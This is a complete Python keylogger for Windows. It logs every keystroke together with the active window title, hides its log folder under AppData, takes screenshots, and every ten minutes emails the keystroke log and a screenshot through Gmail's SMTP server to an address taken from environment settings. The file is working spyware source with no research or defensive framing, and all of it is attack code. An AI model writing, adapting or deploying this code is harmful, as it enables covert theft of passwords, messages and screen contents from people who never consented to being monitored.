from pynput import keyboard
from PIL import ImageGrab
import smtplib
import schedule
import time
import threading
import os
import ctypes
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv
import win32gui

# Load email and password from .env
load_dotenv()
EMAIL = os.getenv("EMAIL")
PASSWORD = os.getenv("PASSWORD")

INTERVAL = 10  # Minutes

# Directory setup
LOG_DIR = os.path.expanduser("~\\AppData\\Roaming\\Logs")
os.makedirs(LOG_DIR, exist_ok=True)

# Hide the folder on Windows
ctypes.windll.kernel32.SetFileAttributesW(LOG_DIR, 2)  # 2 = hidden

LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")

# Get active window title
def get_active_window_title():
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown Window"

# Key logging
def on_press(key):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        title = get_active_window_title()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            f.write(f"{timestamp} - {title} - {key.char}\n")
        except AttributeError:
            f.write(f"{timestamp} - {title} - [{key}]\n")

# Screenshot with timestamp
def capture_screenshot():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    ss_path = os.path.join(LOG_DIR, f"screenshot_{timestamp}.png")
    img = ImageGrab.grab()
    img.save(ss_path)
    return ss_path

# Send logs via email
def send_email():
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        log_data = f.read()

    if not log_data.strip():
        return

    screenshot_path = capture_screenshot()

    msg = MIMEMultipart()
    msg["From"] = EMAIL
    msg["To"] = EMAIL
    msg["Subject"] = "Keylogger Log"

    msg.attach(MIMEText(log_data, "plain"))

    with open(screenshot_path, "rb") as f:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(screenshot_path)}")
        msg.attach(part)

    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(EMAIL, PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print("Failed to send email:", e)

    open(LOG_FILE, "w").close()

# Email scheduler
def run_scheduler():
    schedule.every(INTERVAL).minutes.do(send_email)
    while True:
        schedule.run_pending()
        time.sleep(1)

# Main
if __name__ == "__main__":
    threading.Thread(target=run_scheduler, daemon=True).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
